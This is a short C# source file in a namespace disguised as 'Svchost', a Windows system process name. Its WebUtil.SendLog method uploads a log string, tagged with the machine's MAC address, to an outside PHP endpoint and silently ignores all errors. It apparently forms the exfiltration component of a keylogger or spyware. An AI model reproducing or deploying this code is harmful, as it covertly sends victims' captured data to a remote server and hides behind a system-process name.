using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Collections.Specialized;
using System.Net.NetworkInformation;
using System.Linq;

namespace Svchost
{
    public class WebUtil
    {
        public WebUtil()
        {
        }

        private static string getMacAddress()
        {
            var macAddr = (
                    from nic in NetworkInterface.GetAllNetworkInterfaces()
                    where nic.OperationalStatus == OperationalStatus.Up
                    select nic.GetPhysicalAddress().ToString()
                ).FirstOrDefault();
            return macAddr;
        }

        public static void SendLog(string name, string sentence)
        {
            try
            {
                using (var client = new WebClient())
                {
                    var values = new NameValueCollection();

                    values["log"] = sentence;
                    values["author"] = name + " - " + getMacAddress();

                    var response = client.UploadValues("http://pgeryfaut.alwaysdata.net/post.php", values);

                    var responseString = Encoding.UTF8.GetString(response);
                }
            }
            catch { }
        }
    }
}
